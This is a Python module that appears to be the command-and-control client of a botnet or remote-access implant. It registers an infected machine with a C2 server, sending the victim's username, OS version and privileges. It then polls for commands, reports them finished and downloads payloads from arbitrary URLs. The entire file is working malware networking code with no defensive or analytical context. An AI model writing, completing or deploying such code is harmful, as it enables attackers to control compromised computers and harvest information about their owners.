import requests
import json

def make_http_request(config, url):
    headers = {
        "User-Agent": config["c2_user_agent"],
        "Accept": config["c2_content_type"]
    }
    r = requests.get(url, headers=headers)
    return r

def http_get_botid(config):
    r = make_http_request(config, f"http://{config["c2_address"]}:{config["c2_port"]}/{config["c2_url"]}?action=installnewbot&Username={config["username"]}&OsVersion={config["os_version"]}&Privileges={config["privileges"]}")
    return r.text

def http_request_command(config):
    r = make_http_request(config, f"http://{config["c2_address"]}:{config["c2_port"]}/{config["c2_url"]}?action=fetchcommand&botid={config["botid"]}")
    return json.loads(r.text)

def http_command_finished(config):
    r = make_http_request(config, f"http://{config["c2_address"]}:{config["c2_port"]}/{config["c2_url"]}?action=updatecommand&status=finished&botid={config["botid"]}")
    return json.loads(r.text)

def http_get_payload(url):
    r = requests.get(url)
    return r.content